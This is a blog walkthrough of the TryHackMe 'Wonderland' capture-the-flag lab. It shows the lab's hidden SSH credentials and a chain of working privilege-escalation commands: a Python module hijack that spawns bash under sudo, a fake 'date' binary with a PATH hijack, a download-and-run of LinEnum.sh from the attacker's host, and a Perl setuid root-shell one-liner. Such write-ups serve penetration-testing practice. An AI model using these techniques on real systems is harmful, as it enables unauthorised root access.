<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/" rel="category tag">TryHackME</a></span>            </div>
            <h1 class="post-title entry-title">Wonderland TryHackMe Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/wonderland-tryhackme-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-05-03T16:23:28+00:00">May 3, 2021</time><time class="updated" datetime="2025-06-24T10:06:34+00:00">June 24, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we’re going to solve another boot2root challenge called “Wonderland “. It’s available at TryHackMe for penetration testing practice. This lab is of medium difficultly if we have the right basic knowledge to break the labs and are attentive to all the details we find during the reconnaissance. The credit for making this lab goes to <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://tryhackme.com/p/NinjaJc01">NinjaJc01</a></strong></span>. Let’s get started and learn how to break it down successfully.</span></p>
<p><span style="color: #000000;">Level: <strong>Medium</strong></span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Browsing HTTP Service</span></li>
<li><span style="color: #000000;">Getting SSH Credentials</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Logging in as Alice User</span></li>
<li><span style="color: #000000;">Reading User Flag</span></li>
<li><span style="color: #000000;">Enumerating Python Script</span></li>
<li><span style="color: #000000;">Enumerating Sudo Permissions</span></li>
<li><span style="color: #000000;">Exploiting Sudo Permissions</span></li>
<li><span style="color: #000000;">Getting Shell as rabbit</span></li>
<li><span style="color: #000000;">Enumerating teaParty Binary</span></li>
<li><span style="color: #000000;">Exploiting Path Variable on date</span></li>
<li><span style="color: #000000;">Getting Shell as Hatter</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating using LinEnum.sh</span></li>
<li><span style="color: #000000;">Detecting Capabilities on Perl</span></li>
<li><span style="color: #000000;">Exploiting Capabilities on Perl</span></li>
<li><span style="color: #000000;">Getting Root Shell</span></li>
<li><span style="color: #000000;">Reading Root Flag</span></li>
</ul>
</li>
</ul>
<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
<p><span style="color: #000000;">After Booting up the machine from the <strong><a style="color: #000000;" href="https://tryhackme.com/room/wonderland">TryHackMe: Wonderland</a></strong> Page, we will be provided with a Target IP Address.</span></p>
<p><span style="color: #000000;"><strong>IP Address: 10.10.123.139</strong></span></p>
<p><span style="color: #000000;">This room has 2 flags that we need to find to complete the Machine. Although there are multiple questions or tasks that we need to perform. We will answer those tasks as we go through them.</span></p>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">We will start with a nmap scan with -sC for Default Scripts and -sV for Scanning Versions.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.10.123.139</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1kFNwid_BAI/YJAfoqjeLmI/AAAAAAAAvu0/ZxyNvCL8TD4fdj7QxrvEI4fBYSxhVBw2ACLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Nmap was able to identify 2 services running on the target machine. It included SSH (22) and HTTP (80). The SSH Service is not accessible due to a lack of credentials so we enumerate HTTP Service.</span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">Starting with the HTTP service, we need to take a look at the web browser. We see an image of a well-suited rabbit. There was prose that must mean something to a person who is in touch with the story of Alice which I am unfortunately not. The title Follow the White Rabbit gave me a bit of Matrix vibe. Apart from this, there was not much to go on with this webpage.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.123.139/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nX3hoU5mccU/YJAf1QMA7PI/AAAAAAAAvu4/2NNZLGnkeKYqhtXYYmX-CeMqGKpOBtX9ACLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Performing a directory bruteforce was the next thing that came to mind. Dirb is one of the underrated tools for this purpose and it gets my job done. After going at it for a while, it gave up a page /r/.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.123.139/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NqTyyASqYPs/YJAf49VV_dI/AAAAAAAAvvA/FhVNro3iNcweUtDcVWagT-hVLVK_g_cCACLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Opening /r/ in the web browser gave me another similar page with the title Keep Going. As the first page said that I need to follow the rabbit and then I have a page /r/, it got me thinking it is possible that the author of the machine must have made a series of pages that look like /r/a/b/b/i/t.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.123.139/r/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cWCgtPWPdY4/YJAf8zS1IzI/AAAAAAAAvvE/2-sycft6-44_z3vG_568pbaCMPEumLDWQCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">My prediction came fruitful as when I added /a/ after the /r/, I got another page followed by another one at /b/ and so on. Till I got to the last page, which said Open the door and Enter the wonderland. The webpage had an image of a girl which I can only assume is Alice.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.123.139/r/
http://10.10.123.139/r/a/
http://10.10.123.139/r/a/b
http://10.10.123.139/r/a/b/b
http://10.10.123.139/r/a/b/b/i
http://10.10.123.139/r/a/b/b/i/t</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FktD5fMiU64/YJAgEO4IxVI/AAAAAAAAvvI/CjkvjqFZXrUP5CVi2xpyxE4UNEDE0nKFgCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">The process still don’t make much sense. I decided to get a bit technical and come out to the real world and look at the source code for any clues. It is very easy to miss on the first look but there is a set of credentials that are styled using CSS to be invisible. It is not that difficult to do, all it requires is to give the display a none value.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">view-source:http://10.10.123.139/r/a/b/b/i/t/
alice:HowDothTheLittleCrocodileImproveHisShiningTail</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BDBRlgwCkQw/YJAgIG_LfDI/AAAAAAAAvvM/hCMAHPQ8wuoinRBJBwKahh42YZV7mjRIQCLcBGAsYHQ/s16000/6.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">The username was alice and the password was HowDothTheLittleCrocodileImproveHisShiningTail. Since I was unable to log in ssh before, we can now try to log in using this set of credentials. After logging in, I tried to enumerate further by listing the contents of the directory. There was a text file named root.txt and a python script walrus_and_the_carpenter.py.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh alice@10.10.123.139
HowDothTheLittleCrocodileImproveHisShiningTail
ls</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AC_9aNE2DQM/YJAgM9B9afI/AAAAAAAAvvY/twgakh3XroY3xKysOOPTJCE6C03S3oXcwCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">Since root.txt seems like a flag, we tried to read the flag and we are not able to read it as we don’t have the permission to read that file. I think that the author has kept the root flag here to taunt us. If the root flag is in the user folder, then the user flag must be in the root folder. Let’s see if we can try to read the user flag. We got our user.txt flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat root.txt
cat /root/user.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Tol4VxwsO9g/YJAge-gae1I/AAAAAAAAvvo/qZ4ZtFTTGhEO2O7dVSxG2hGLArGI1PEDgCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Apart from the root flag that we might be able to read after elevated privileges, we have a python script in the directory that I landed. Reading the python script, it was clear that it has a collection of different lines that gets printed on random. This requires the python script to import the random module. One of the things that usually help with exploiting the python scripts is replacing the module that they are importing with something malicious. But first, let’s check if there is any profit to tweak around this python file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat walrus_and_the_carpenter.py</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PqC6T0TRrbw/YJAgjc-xO1I/AAAAAAAAvvw/jZ-SlkNvDicvDs5yhKs3nPVv78GRph2cQCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">One of the enumeration tasks we do to find ways to elevate privilege is to check for sudo permission. This means finding the binaries or files that the current user can run with elevated privileges. Upon running sudo -l, it was clear that we can run the walrus_and_the_carpenter.py with python3.6. This means that our assumption of working around the python script is accurate.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oHrh4VcwqrM/YJAgmq77BeI/AAAAAAAAvv0/T-0ICAa0YBcbp30SFEKSAbRQ3CLq7QZ_gCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">We use the nano editor to create a random.py in the same directory as the walrus_and_the_carpenter.py. Then we proceed to add the shell invocation command into the random.py script that we just created. To give a better understanding, the import function in python gives priority to the modules if they are in the same directory as the modules that might be in the Python directory. We are exploiting this to get our shell command to get executed with the walrus_and_the_carpenter.py. </span></p>
<p><span style="color: #000000;">We use the sudo command to run the script as a rabbit user. Using this we were able to get a shell for the user rabbit. Moving into the home directory of the rabbit user, we found a binary by the name of teaParty. To inspect the execution, we ran the binary. It said that we need a Mad Hatter which will come approximately one hour from the point we ran the script. There was an input field, inside which after entering some characters, just spews a Segmentation fault. This was practically not very useful so to take a closer look at it, we transferred it to our local machine.  </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano random.py
import os
os.system("/bin/bash")
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
cd /home/rabbit/
ls
./teaParty
python3 -m http.server</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GjlKREUPqRE/YJAgtL_qcpI/AAAAAAAAvv4/SI04rRG-PiIQg5Fic-ehx1SmMsnMwSrYACLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">After downloading the teaParty to our local machine, I used the strings command to check for any human-readable strings inside the machine code for the binary. We get that the executable just prints the current time plus an hour for the arrival of mad Hatter without any more context to it. We also see that the segmentation fault is just a text. There is no actual segmentation fault that is occurring in the binary.  </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://10.10.123.139:8000/teaParty
strings teaParty
/bin/echo -n 'Probably by ' &amp;&amp; date --date='next hour' -R</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gfGTMB3VsOk/YJAgxDRv4xI/AAAAAAAAvwA/xqtlCZjD9VIFTZccodzSBuHRfZa88vqDQCLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Since the only that the script is doing is running the date command to find out the time and then print the next hour, we need to exploit this. To exploit, we create our version of the date command with shell invocation command and then export the path of our date into the system path so that it executes our date command instead of the original one. We can check if the path was added using the echo $PATH command. After this when we execute the teaParty binary we see that we have the shell as the hatter user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano date
chmod +x date
echo $PATH
export PATH=/home/rabbit:$PATH
echo $PATH
./teaParty</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-A0qXWwJ5uMs/YJAg1CklkeI/AAAAAAAAvwE/b4ZHuvjorY8BCKtLm1C9Qjg-XepOLhTZQCLcBGAsYHQ/s16000/13.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Now that we have the hatter user access, we move into the hatter home directory to find a password.txt. Inside it, we see a password but we don’t see any way to use that password.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home/hatter
ls
cat password.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-H_m77OMA7uY/YJAg8NifiGI/AAAAAAAAvwM/I7nxZMo48EcjI9y93JJnPyiUoxGdY0ppACLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">Then at this point where I was truly clueless, I resorted to running the LinEnum to find ways to elevate privileges.  We transfer the LinEnum.sh file from our Local Kali machine to the target machine. After providing proper permission, we run the script.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://10.10.150.219:6969/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PuQ1HNYJAwk/YJAhFyVHOJI/AAAAAAAAvwc/EEHSKEcGJUwKD3ZI9f1PBRGDkPk_3mWIACLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">After looking for some time, we found that Perl is set with the capabilities. This could be helpful to get root</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xWL7QaCKTSU/YJAhKBAndfI/AAAAAAAAvwg/z-nJyOBV8kEQiDdm9ZTfP28xn6RobfCkQCLcBGAsYHQ/s16000/17.png"/></span></p>
<p><span style="color: #000000;">We used the <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://gtfobins.github.io/gtfobins/perl/">gtfobin</a> </strong></span>to get the exact command that we need to get the shell using the Perl when capabilities are set.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QyM7DaLFB80/YJAhQKd9LgI/AAAAAAAAvwk/UD7B4lTMab8ziYp0rzOuHljHrS_rHCwhgCLcBGAsYHQ/s16000/18.png"/></span></p>
<p><span style="color: #000000;">We checked the path of Perl using which command and then ran the shell command that we got from the gtfobin to get the root. Now that we have the root shell, we can read the root flag that was located inside the Alice user’s home directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">which perl
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
id
cat /home/alice/root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hJYMK9rJUpU/YJAhTTz6GVI/AAAAAAAAvwo/iYn-bCHfaqMf-BGUDZU8Z3R7GOTayoKagCLcBGAsYHQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">Hope you have enjoyed this TryHackMe Write-up. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/">Link</a> </strong><span style="color: #000000;">for more TryHackMe CTF’s.</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
